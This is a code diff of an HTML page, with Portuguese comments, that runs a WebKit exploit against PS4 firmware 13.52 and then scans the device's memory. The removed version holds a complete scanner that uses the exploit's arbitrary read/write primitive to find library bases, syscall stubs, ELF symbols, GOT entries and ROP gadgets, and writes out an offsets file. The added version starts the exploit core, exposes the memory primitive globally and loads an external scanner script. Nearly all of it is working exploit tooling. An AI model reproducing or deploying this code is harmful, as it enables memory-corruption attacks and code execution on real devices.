@@ -4,7 +4,7 @@
 <head>
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1.0">
-<title>PS4 13.52 — Offset Scanner</title>
+<title>PS4 FW 13.52 — Exploit + Offset Scanner</title>
 <style>
 *{margin:0;padding:0;box-sizing:border-box}
 body{background:#06080f;color:#c8cfd8;font:13px/1.5 'Courier New',monospace;
@@ -27,20 +27,19 @@ h1{color:#00c8ff;font-size:14px;letter-spacing:3px;text-transform:uppercase;
   padding:8px 10px;font-size:11px;line-height:1.6;margin-bottom:8px}
 .ok{color:#00c853}.w{color:#f0a500}.e{color:#ff5252;font-weight:bold}
 .d{color:#2a2d3e}.a{color:#bd93f9}.s{color:#00c8ff;font-weight:bold}
-.i{color:#5b9bd5}.f{color:#a78bfa;font-weight:bold}
+.i{color:#5b9bd5}
 /* Output box */
 #out-box{width:100%;max-width:800px;background:#030806;border:2px solid #00c853;
   border-radius:5px;padding:12px;display:none;margin-bottom:8px}
 #out-box .ot{color:#fff;font-weight:bold;margin-bottom:6px;font-size:12px}
 #out-pre{font-size:11px;color:#4ade80;line-height:1.7;white-space:pre;
   overflow-x:auto;max-height:400px;overflow-y:auto}
-/* Copy button */
 #btn-copy{background:#1e3a5f;border:none;color:#60a5fa;padding:6px 14px;
   font:12px monospace;border-radius:3px;cursor:pointer;margin-top:6px}
 </style>
 </head>
 <body>
-<h1>PS4 FW 13.52 — Offset Scanner</h1>
+<h1>PS4 FW 13.52 — Exploit + Offset Scanner</h1>
 <div id="sb"><div id="dot"></div><div id="st">Aguardando exploit...</div></div>
 <div id="pb-w"><div id="pb"></div></div>
 <div id="con"></div>
@@ -50,455 +49,103 @@ h1{color:#00c8ff;font-size:14px;letter-spacing:3px;text-transform:uppercase;
   <button id="btn-copy" onclick="copyOutput()">📋 Copiar</button>
 </div>
 
+<!-- === CARREGAMENTO DOS MÓDULOS DO EXPLOIT === -->
 <script type="module">
-import { int64 }             from './resources/int64.js';
+import { int64 }              from './resources/int64.js';
 import { establishPrimitive } from './resources/core.js?v=10';
-import { installWindowP }    from './resources/mem.js';
-import offsets13_52          from './13_52.js';
+import { installWindowP }     from './resources/mem.js';
+import offsets13_52           from './13_52.js';
+
 globalThis.int64 = int64;
 
-const $st =$d=>document.getElementById($d);
-const log=(m,c='i')=>{const d=document.createElement('div');d.className=c;
-  d.textContent=m;$st('con').appendChild(d);$st('con').scrollTop=9e9;};
-const logH=m=>log('=== '+m+' ===','s');
-const setStatus=(m,s='r')=>{$st('st').textContent=m;$st('dot').className=s;};
-const setProg=(p,show=true)=>{$st('pb-w').style.display=show?'block':'none';
-  $st('pb').style.width=Math.min(100,p)+'%';};
-
-/* ─── int64 helpers ─── */
-function i64n(a){return a.hi*0x100000000+a.low;}
-function n64(n){const h=Math.floor(n/0x100000000)>>>0,l=(n-h*0x100000000)>>>0;return new int64(l,h);}
-function r1(p,a){return p.read1(a);}
-function r4(p,a){return p.read4(a)>>>0;}
-function r8(p,a){return p.read8(a);}
-function r8n(p,a){return i64n(r8(p,a));}
-function rdStr(p,a,max=128){let s='';for(let i=0;i<max;i++){const c=r1(p,a.add32(i));if(!c)break;s+=String.fromCharCode(c);}return s;}
-
-/* ─── PHASE 1: Verify confirmed bases ─── */
-function verifyBases(p,wkBase,lkBase,lcBase){
-  logH('FASE 1 — Verificação das bases');
-
-  // WebKit: read first bytes (might be code or ELF)
-  try{
-    const wb0=r4(p,wkBase);
-    log('  wkBase[0] = 0x'+wb0.toString(16)+(wb0===0x464c457f?' (ELF ✓)':' (SPRX: header não mapeado — normal)'), wb0===0x464c457f?'ok':'w');
-  }catch(_){log('  wkBase inacessível','e');}
-
-  // libkernel: check ELF magic (system libs are usually mapped with header)
-  let lkELF=false;
-  try{
-    const lk0=r4(p,lkBase);
-    lkELF=lk0===0x464c457f;
-    log('  lkBase[0] = 0x'+lk0.toString(16)+(lkELF?' ✓ ELF mapeado!':' (sem ELF magic)'), lkELF?'ok':'w');
-  }catch(_){log('  lkBase inacessível','e');}
-
-  // libc: same check
-  let lcELF=false;
-  try{
-    const lc0=r4(p,lcBase);
-    lcELF=lc0===0x464c457f;
-    log('  lcBase[0] = 0x'+lc0.toString(16)+(lcELF?' ✓ ELF mapeado!':' (sem ELF magic)'), lcELF?'ok':'w');
-  }catch(_){log('  lcBase inacessível','e');}
-
-  // Validate known function: sceKernelSendNotificationRequest at lk+0x48B0
-  try{
-    const notif=r1(p,lkBase.add32(0x48B0));
-    log('  lk+0x48B0 (sceKernelSendNotification): byte[0]=0x'+notif.toString(16)+
-      ' (esperado 0x55=push rbp ou 0x53=push rbx)', (notif===0x55||notif===0x53)?'ok':'w');
-  }catch(_){log('  Não foi possível ler lk+0x48B0','e');}
-
-  return {lkELF,lcELF};
-}
-
-/* ─── PHASE 2: Scan libkernel for syscall stubs ───────────────────
-   PS4 libkernel wraps FreeBSD syscalls with:
-     push rbp / mov rbp,rsp / mov eax,SYSNUM / syscall / pop rbp / ret
-   Opcode: 55 48 89 E5 B8 XX XX XX XX 0F 05 5D C3
-   Also scan for PS4-specific function signatures.
-   ──────────────────────────────────────────────────────────────── */
-async function scanLibkernelSyscalls(p,lkBase,scanSizeMB=2){
-  logH('FASE 2 — Scan libkernel syscall stubs');
-  const SCAN=scanSizeMB*1024*1024;
-  const found={};
-  const YIELD_AT=0x20000; // yield every 128 KB
-
-  // Known syscall numbers → name mapping (FreeBSD + PS4 custom)
-  const sysmap={
-    1:'exit',2:'fork',3:'read',4:'write',5:'open',6:'close',
-    7:'wait4',9:'link',10:'unlink',12:'chdir',14:'mknod',15:'chmod',
-    17:'break',19:'lseek',20:'getpid',21:'mount',
-    128:'sendto',133:'sendmsg',196:'stat',
-    477:'sceKernelGetSystemSwVersion',580:'sceKernelSendNotificationRequest',
-  };
-
-  // PS4 notification syscall = 0x244 = 580
-  const PS4_NOTIF_SYSCALL=580;
-
-  for(let off=0;off<SCAN;off++){
-    if(off%YIELD_AT===0){
-      setProg((off/SCAN)*100);
-      setStatus('Scan libkernel: 0x'+off.toString(16)+'/0x'+SCAN.toString(16));
-      await new Promise(r=>setTimeout(r,0));
-    }
-
-    let b;
-    try{b=r1(p,lkBase.add32(off));}catch(_){continue;}
-
-    // Pattern: push rbp (55) + mov rbp,rsp (48 89 E5) + mov eax,imm32 (B8 xx xx xx xx) + syscall (0F 05)
-    if(b!==0x55)continue;
-    try{
-      const b1=r1(p,lkBase.add32(off+1));
-      const b2=r1(p,lkBase.add32(off+2));
-      const b3=r1(p,lkBase.add32(off+3));
-      const b4=r1(p,lkBase.add32(off+4));
-      if(b1!==0x48||b2!==0x89||b3!==0xE5||b4!==0xB8)continue;
-
-      const sn0=r1(p,lkBase.add32(off+5));
-      const sn1=r1(p,lkBase.add32(off+6));
-      const sn2=r1(p,lkBase.add32(off+7));
-      const sn3=r1(p,lkBase.add32(off+8));
-      const syscallNum=(sn3<<24)|(sn2<<16)|(sn1<<8)|sn0;
-
-      const bA=r1(p,lkBase.add32(off+9));
-      const bB=r1(p,lkBase.add32(off+10));
-      if(bA!==0x0F||bB!==0x05)continue;
-
-      const bC=r1(p,lkBase.add32(off+11));
-      const bD=r1(p,lkBase.add32(off+12));
-      if(bC!==0x5D||bD!==0xC3)continue;
-
-      // Found! push rbp; mov rbp,rsp; mov eax,SYS; syscall; pop rbp; ret
-      const name=sysmap[syscallNum]||'syscall_0x'+syscallNum.toString(16);
-      found[name]=off;
-      log('  [FOUND] +0x'+off.toString(16).padStart(6,'0')+' syscall='+syscallNum+' → '+name,'ok');
-    }catch(_){}
-  }
-
-  // Also look for sceKernelSendNotificationRequest via known offset
-  found['sceKernelSendNotificationRequest']=0x48B0;
-  log('  [KNOWN] +0x48B0 sceKernelSendNotificationRequest','a');
-  found['getpid']=0x10E4D;
-  log('  [KNOWN] +0x10E4D getpid','a');
-
-  return found;
-}
-
-/* ─── PHASE 3: ELF-based libkernel symbol scan ─── */
-async function scanLibkernelELF(p,lkBase){
-  logH('FASE 3 — ELF parse libkernel (se disponível)');
-  const found={};
-  try{
-    const magic=r4(p,lkBase);
-    if(magic!==0x464c457f){log('  ELF não mapeado — pulando','w');return found;}
-
-    const e_phoff=r8n(p,lkBase.add32(0x20));
-    const e_phnum=r4(p,lkBase.add32(0x38))&0xFFFF;
-    log(`  e_phoff=0x${e_phoff.toString(16)} e_phnum=${e_phnum}`,'d');
-
-    let strtab=0,symtab=0,syment=0x18,dynOff=0;
-    for(let i=0;i<Math.min(e_phnum,32);i++){
-      const ph=lkBase.add32(e_phoff+i*0x38);
-      if(r4(p,ph)===2){dynOff=r8n(p,ph.add32(8));break;}
-    }
-    if(!dynOff){log('  PT_DYNAMIC não encontrado','w');return found;}
-
-    const dynBase=lkBase.add32(dynOff);
-    for(let j=0;;j++){
-      const tag=r8n(p,dynBase.add32(j*16));
-      const val=r8n(p,dynBase.add32(j*16+8));
-      if(tag===0)break;
-      if(tag===5)strtab=val;
-      if(tag===6)symtab=val;
-      if(tag===11)syment=val;
-    }
-    if(!strtab||!symtab){log('  strtab/symtab não encontrados','w');return found;}
-
-    log('  strtab=0x'+strtab.toString(16)+' symtab=0x'+symtab.toString(16),'d');
-
-    // Scan symbol table for known names
-    const wanted=['sceKernelSendNotificationRequest','pthread_create','pthread_join',
-      '__stack_chk_guard','memset','malloc','free','memcpy','setjmp','longjmp',
-      'sceKernelGetCurrentCpu','scePthreadCreate','scePthreadJoin','sleep',
-      'sceKernelDlsym','sysctlbyname','getpid'];
-
-    for(let i=0;i<8192;i++){
-      await new Promise(r=>setTimeout(r,0)); // yield occasionally
-      try{
-        const sym=lkBase.add32(symtab+i*syment);
-        const st_name=r4(p,sym)>>>0;
-        const st_value=r8n(p,sym.add32(8));
-        if(!st_name||!st_value)continue;
-        const name=rdStr(p,lkBase.add32(strtab+st_name));
-        if(wanted.some(w=>name===w||name.includes(w))){
-          found[name]=st_value;
-          log('  [SYM] '+name+' = +0x'+st_value.toString(16),'ok');
-        }
-      }catch(_){break;}
-    }
-  }catch(e){log('  ELF parse erro: '+e.message,'e');}
-  return found;
-}
-
-/* ─── PHASE 4: WebKit GOT scan ─────────────────────────────────
-   WebKit .data/GOT starts after .rodata ends (~93.2 MB from base).
-   Scan 101-130 MB range looking for:
-     - hi=8, lo in [0x45c74000, 0x45d00000] → libkernel pointers
-     - hi=0x93 or hi=0x94 → libc pointers
-   Record the scan offset → OFFSET_wk_* values.
-   ─────────────────────────────────────────────────────────────── */
-async function scanWebkitGOT(p,wkBase,lkBase,lcBase){
-  logH('FASE 4 — WebKit GOT scan (101-130 MB from base)');
-  const wkN=i64n(wkBase);
-  const lkN=i64n(lkBase);
-  const lcN=i64n(lcBase);
-  const lkHi=lkBase.hi, lcHi=lcBase.hi;
-
-  const START=0x6530070, END=0x8200000; // 101 to 130 MB
-  const results={lk:[],lc:[]};
-
-  for(let off=START;off<END;off+=8){
-    if((off-START)%0x200000===0){
-      const mb=((off-START)/1024/1024).toFixed(0);
-      setStatus('GOT scan: +'+mb+'MB');
-      await new Promise(r=>setTimeout(r,0));
-    }
-    try{
-      const ptr=r8(p,wkBase.add32(off));
-      if(!ptr.hi)continue;
-      if(ptr.hi===lkHi){
-        const diff=ptr.low-lkBase.low;
-        if(diff>0&&diff<0x100000){
-          log('  [lk-GOT] wk+0x'+off.toString(16)+' → lk+0x'+diff.toString(16),'ok');
-          results.lk.push({wkOff:off,lkRva:diff,ptr:i64n(ptr)});
-          if(results.lk.length>=4)break; // enough samples
-        }
-      }else if(ptr.hi===lcHi){
-        const diff=ptr.low-lcBase.low;
-        if(diff>0&&diff<0x400000){
-          log('  [lc-GOT] wk+0x'+off.toString(16)+' → lc+0x'+diff.toString(16),'a');
-          results.lc.push({wkOff:off,lcRva:diff,ptr:i64n(ptr)});
-          if(results.lc.length>=4)break;
-        }
-      }
-    }catch(_){}
-  }
-  return results;
-}
-
-/* ─── PHASE 5: ROP gadget scan in WebKit .text ─────────────────
-   Common gadgets:
-   5F C3           pop rdi; ret
-   5E C3           pop rsi; ret
-   5A C3           pop rdx; ret
-   59 C3           pop rcx; ret
-   41 5F C3        pop r15; ret
-   41 5E C3        pop r14; ret
-   48 89 07 C3     mov [rdi],rax; ret
-   48 87 07 C3     xchg [rdi],rax; ret
-   48 8B 07 C3     mov rax,[rdi]; ret
-   FF D0 C3        call rax; ret  (jmp rax is FF E0)
-   C3              ret (used for pivots)
-   ─────────────────────────────────────────────────────────────── */
-async function scanRopGadgets(p,wkBase,ctor_rva){
-  logH('FASE 5 — ROP gadgets em WebKit .text');
-  const TEXT_END=ctor_rva+0x800000; // scan up to ctor+8MB
-  const GADGETS={};
-
-  const patterns={
-    'pop_rdi_ret':   [0x5F,0xC3],
-    'pop_rsi_ret':   [0x5E,0xC3],
-    'pop_rdx_ret':   [0x5A,0xC3],
-    'pop_rcx_ret':   [0x59,0xC3],
-    'pop_r8_ret':    [0x41,0x58,0xC3],
-    'pop_r9_ret':    [0x41,0x59,0xC3],
-    'pop_r15_ret':   [0x41,0x5F,0xC3],
-    'pop_r14_ret':   [0x41,0x5E,0xC3],
-    'pop_rax_ret':   [0x58,0xC3],
-    'pop_rbp_ret':   [0x5D,0xC3],
-    'pop_rbx_ret':   [0x5B,0xC3],
-    'jmp_rax':       [0xFF,0xE0],
-    'call_rax_ret':  [0xFF,0xD0,0xC3],
-    'mov_rdi_rax_ret':[0x48,0x89,0x07,0xC3],
-    'mov_rax_rdi_ret':[0x48,0x8B,0x07,0xC3],
-    'add_rsp8_ret':  [0x48,0x83,0xC4,0x08,0xC3],
-    'xchg_rax_rsp_ret':[0x48,0x94,0xC3],
-    'mov_rsp_rdi_ret':[0x48,0x89,0xFC,0xC3],
-    'nop_ret':       [0x90,0xC3],
-  };
-
-  const SCAN_END=Math.min(TEXT_END,60*1024*1024);
-  const YIELD_AT=0x400000;
-
-  for(let off=0;off<SCAN_END;off++){
-    if(off%YIELD_AT===0){
-      setProg((off/SCAN_END)*100);
-      await new Promise(r=>setTimeout(r,0));
-    }
-
-    let b;
-    try{b=r1(p,wkBase.add32(off));}catch(_){continue;}
-
-    for(const[name,pat]of Object.entries(patterns)){
-      if(GADGETS[name])continue; // already found
-      if(b!==pat[0])continue;
-      let match=true;
-      for(let k=1;k<pat.length;k++){
-        try{if(r1(p,wkBase.add32(off+k))!==pat[k]){match=false;break;}}
-        catch(_){match=false;break;}
-      }
-      if(match){
-        GADGETS[name]=off;
-        log('  [ROP] '+name+' @ wk+0x'+off.toString(16),'ok');
-      }
-    }
-    if(Object.keys(GADGETS).length>=Object.keys(patterns).length)break;
-  }
-
-  setProg(0,false);
-  return GADGETS;
-}
-
-/* ─── Generate 13_52.js content ─── */
-function buildOutput(wkBase,lkBase,lcBase,syscalls,elfSyms,got,gadgets,ctorRva){
-  const lkN=i64n(lkBase),lcN=i64n(lcBase);
-  const all={...syscalls,...elfSyms};
-
-  let s='// PS4 FW 13.52 — gerado pelo scanner em '+(new Date().toLocaleString())+'\n';
-  s+='// WebKit CTOR_RVA=0x'+ctorRva.toString(16)+' | lkBase=0x'+lkN.toString(16)+' | lcBase=0x'+lcN.toString(16)+'\n\n';
-
-  s+='const OFFSET_wk_host_constructor_candidates = [0x'+ctorRva.toString(16)+'];\n\n';
-
-  s+='// ─── WebKit GOT offsets ───\n';
-  if(got.lk.length>0){
-    s+='const OFFSET_wk___stack_chk_guard_import = 0x'+got.lk[0].wkOff.toString(16)+';  // lk+0x'+got.lk[0].lkRva.toString(16)+'\n';
-    if(got.lk.length>1)s+='const OFFSET_wk_memset_import = 0x'+got.lk[1].wkOff.toString(16)+';  // lk+0x'+got.lk[1].lkRva.toString(16)+'\n';
-    else s+='const OFFSET_wk_memset_import = 0x0;  // TODO\n';
-  }else{
-    s+='const OFFSET_wk___stack_chk_guard_import = 0x0;  // TODO — scan não encontrou\n';
-    s+='const OFFSET_wk_memset_import = 0x0;  // TODO\n';
-  }
-  if(got.lk.length>0)
-    s+='const OFFSET_lk___stack_chk_guard = 0x'+got.lk[0].lkRva.toString(16)+';\n';
-  else s+='const OFFSET_lk___stack_chk_guard = 0x0;  // TODO\n';
-  if(got.lc.length>0){
-    s+='const OFFSET_lc_memset = 0x'+got.lc[0].lcRva.toString(16)+';\n';
-    s+='// (GOT entry para libc: wk+0x'+got.lc[0].wkOff.toString(16)+')\n';
-  }else s+='const OFFSET_lc_memset = 0x0;  // TODO\n';
-
-  s+='\n// ─── libkernel function RVAs (lkBase=0x'+lkN.toString(16)+') ───\n';
-  const lkFns=['sceKernelSendNotificationRequest','getpid','pthread_create','pthread_join',
-    'scePthreadCreate','scePthreadJoin','sceKernelGetCurrentCpu','sceKernelDlsym',
-    'sysctlbyname','sleep','pthread_create_name_np'];
-  const lkKnown={
-    sceKernelSendNotificationRequest:0x48B0,
-    getpid:0x10E4D,
-  };
-  for(const fn of lkFns){
-    const rva=all[fn]||lkKnown[fn]||0;
-    const todo=rva?'':'  // TODO';
-    s+=`const OFFSET_lk_${fn} = 0x${rva.toString(16)};${todo}\n`;
-  }
-
-  s+='\n// ─── libkernel data RVAs ───\n';
-  s+='const OFFSET_lk__thread_list = 0x0;  // TODO — requer dump\n';
-  s+='const OFFSET_lk_worker_wait_return = 0x0;  // TODO — fingerprint da thread worker\n';
-
-  s+='\n// ─── libSceLibc RVAs (lcBase=0x'+lcN.toString(16)+') ───\n';
-  const lcFns=['malloc','free','memcpy','strcmp','memcmp','vsnprintf','setjmp','longjmp'];
-  for(const fn of lcFns){
-    const rva=all[fn]||0;
-    s+=`const OFFSET_lc_${fn} = 0x${rva.toString(16)};${rva?'':'  // TODO'}\n`;
-  }
-
-  s+='\n// ─── vtable ───\n';
-  s+='const OFFSET_wk_vtable_first_element = 0x0;  // TODO\n';
-
-  s+='\n// ─── ROP gadgets em WebKit (wkBase dinâmico) ───\n';
-  s+='let wk_gadgetmap = {\n';
-  for(const[name,rva]of Object.entries(gadgets)){
-    s+='  '+name+': 0x'+rva.toString(16)+',\n';
-  }
-  s+='};\n';
-
-  s+='\n// ─── syscall_map ───\n';
-  s+='let syscall_map = {\n';
-  for(const[name,rva]of Object.entries(syscalls)){
-    if(['sceKernelSendNotificationRequest','getpid'].includes(name))continue;
-    s+='  '+name+': lkBase.add32(0x'+rva.toString(16)+'),\n';
-  }
-  s+='};\n';
-
-  s+='\n// ─── Bases fixas confirmadas para FW 13.52 ───\n';
-  s+='// libkernel = 0x'+lkN.toString(16)+' (FIXO — não muda com ASLR)\n';
-  s+='// libSceLibc = 0x'+lcN.toString(16)+' (FIXO — não muda com ASLR)\n';
-
-  return s;
-}
-
-window.copyOutput=function(){
-  const txt=document.getElementById('out-pre').textContent;
-  navigator.clipboard?.writeText(txt).then(()=>log('Copiado!','ok'));
+const $  = id => document.getElementById(id);
+const log = (m, c='i') => {
+  const d = document.createElement('div');
+  d.className = c;
+  d.textContent = m;
+  $('con').appendChild(d);
+  $('con').scrollTop = 9e9;
+};
+const setStatus = (m, s='r') => {
+  $('st').textContent = m;
+  $('dot').className = s;
+};
+const setProg = (p, show=true) => {
+  $('pb-w').style.display = show ? 'block' : 'none';
+  $('pb').style.width = Math.min(100, p) + '%';
 };
 
-/* ─── BOOT ─── */
-(async()=>{
-  setStatus('Executando exploit...','r');
+window.copyOutput = function() {
+  const txt = $('out-pre').textContent;
+  navigator.clipboard?.writeText(txt).then(() => log('Copiado!', 'ok'));
+};
+
+/* ────────────────────────────────────────────────
+   FASE 1: Executar o exploit (slopkit core)
+   ──────────────────────────────────────────────── */
+(async () => {
+  setStatus('Executando exploit slopkit...', 'r');
+  log('[*] Iniciando establishPrimitive...', 'i');
+
   let carrier;
-  try{
-    carrier=await establishPrimitive({
-      onEvent(tag,det){if(['SSV-STORED','SSV-GROOM-ENTER','PAIR-CELLS'].includes(tag))
-        log('  ['+tag+'] '+det,'d');},maxAttempts:0});
-  }catch(e){setStatus('exploit falhou: '+e.message,'e');log(e.message,'e');return;}
+  try {
+    carrier = await establishPrimitive({
+      onEvent(tag, det) {
+        if (['SSV-STORED','SSV-GROOM-ENTER','PAIR-CELLS','READ-PRIMITIVE-PASS'].includes(tag)) {
+          log('  [' + tag + '] ' + det, 'd');
+        }
+      },
+      maxAttempts: 0
+    });
+  } catch (e) {
+    setStatus('Exploit falhou: ' + e.message, 'e');
+    log('ERRO: ' + e.message, 'e');
+    return;
+  }
 
-  const p=installWindowP(carrier,{promote:true,onEvent:()=>{}});
-  window.p=p;
-  log('[+] R/W instalado','ok');
+  log('[+] establishPrimitive OK — promovendo para window.p', 'ok');
 
-  // Get bases
-  const ctorN=globalThis.__ps5NativeCtor;
-  if(!ctorN){setStatus('__ps5NativeCtor ausente','e');return;}
-  const ctorAddr=n64(ctorN);
-  const CTOR_RVA=0x36F9E20;
-  const wkBase=n64(ctorN-CTOR_RVA);
-  const lkBase=n64(0x8045c74000);
-  const lcBase=n64(0x93840fc000);
+  let p;
+  try {
+    p = installWindowP(carrier, {
+      promote: true,
+      onEvent(tag, det) {
+        log('  [mem] ' + tag + ' ' + det, 'd');
+      }
+    });
+  } catch (e) {
+    setStatus('installWindowP falhou: ' + e.message, 'e');
+    log('ERRO: ' + e.message, 'e');
+    return;
+  }
 
-  log('[+] __ps5NativeCtor = 0x'+ctorAddr.toString(),'ok');
-  log('[+] WebKit Base     = 0x'+wkBase.toString()+' (ctor - 0x36F9E20)','ok');
-  log('[+] libkernel Base  = 0x'+lkBase.toString()+' (FIXO FW 13.52)','ok');
-  log('[+] libc Base       = 0x'+lcBase.toString()+' (FIXO FW 13.52)','ok');
+  window.p = p;
+  setStatus('window.p ativo! Carregando scanner...', 'ok');
+  log('[+] window.p instalado com sucesso!', 'ok');
+  log('[+] __ps5NativeCtor = 0x' + (globalThis.__ps5NativeCtor?.toString(16) || '???'), 'ok');
 
-  // Phase 1: verify
-  const {lkELF}=verifyBases(p,wkBase,lkBase,lcBase);
+  /* ────────────────────────────────────────────────
+     FASE 2: Carregar o scanner em runtime
+     ──────────────────────────────────────────────── */
+  log('', 'i');
+  log('=== CARREGANDO RUNTIME SCANNER ===', 's');
 
-  // Phase 2: syscall stubs
-  setProg(0,true);
-  setStatus('Scan syscall stubs libkernel...');
-  const syscalls=await scanLibkernelSyscalls(p,lkBase,2);
-  log('[+] '+Object.keys(syscalls).length+' syscall stubs encontrados','ok');
+  const scannerScript = document.createElement('script');
+  scannerScript.src = './ps4_runtime_scanner.js';
+  scannerScript.onload = () => {
+    log('[+] Scanner carregado. Executando...', 'ok');
+    // O scanner.js define window.runScanner() ou executa main() automaticamente
+    if (typeof window.runScanner === 'function') {
+      window.runScanner();
+    }
+  };
+  scannerScript.onerror = () => {
+    setStatus('Falha ao carregar ps4_runtime_scanner.js', 'e');
+    log('ERRO: Não foi possível carregar ./ps4_runtime_scanner.js', 'e');
+    log('Verifique se o arquivo está na mesma pasta do index.html', 'w');
+  };
+  document.body.appendChild(scannerScript);
 
-  // Phase 3: ELF symbols (if available)
-  const elfSyms=lkELF?await scanLibkernelELF(p,lkBase):{};
-  log('[+] '+Object.keys(elfSyms).length+' símbolos ELF extraídos','ok');
-
-  // Phase 4: WebKit GOT
-  setStatus('Scan WebKit GOT...');
-  const got=await scanWebkitGOT(p,wkBase,lkBase,lcBase);
-  log('[+] GOT lk: '+got.lk.length+' entries | GOT lc: '+got.lc.length+' entries','ok');
-
-  // Phase 5: ROP gadgets
-  setStatus('Scan ROP gadgets...');
-  const gadgets=await scanRopGadgets(p,wkBase,CTOR_RVA);
-  log('[+] '+Object.keys(gadgets).length+' ROP gadgets encontrados','ok');
-
-  // Generate output
-  const output=buildOutput(wkBase,lkBase,lcBase,syscalls,elfSyms,got,gadgets,CTOR_RVA);
-  document.getElementById('out-pre').textContent=output;
-  document.getElementById('out-box').style.display='block';
-  setProg(100);
-  setStatus('Scanner completo — copie o 13_52.js gerado!','ok');
-  log('','');
-  log('✅ Scanner concluído. Copie o 13_52.js e substitua o arquivo existente.','ok');
 })();
 </script>
 </body>
